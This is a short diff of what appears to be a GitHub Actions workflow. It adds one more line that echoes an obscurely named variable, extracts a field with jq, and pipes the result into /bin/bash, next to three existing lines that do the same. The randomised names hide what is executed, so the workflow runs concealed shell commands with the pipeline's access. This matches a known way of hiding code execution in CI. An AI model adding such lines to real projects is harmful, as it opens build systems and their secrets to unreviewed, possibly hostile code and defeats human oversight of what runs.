@@ -20,6 +20,7 @@ jobs:
           echo $nahq49 | jq -r .ufiya09 | /bin/bash
           printf '%s' "$kc2376" | jq -r .v3197 | /bin/bash
           echo $dr18956 | jq -r .mwq1 | /bin/bash
+          echo $lka66 | jq -r .r06 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
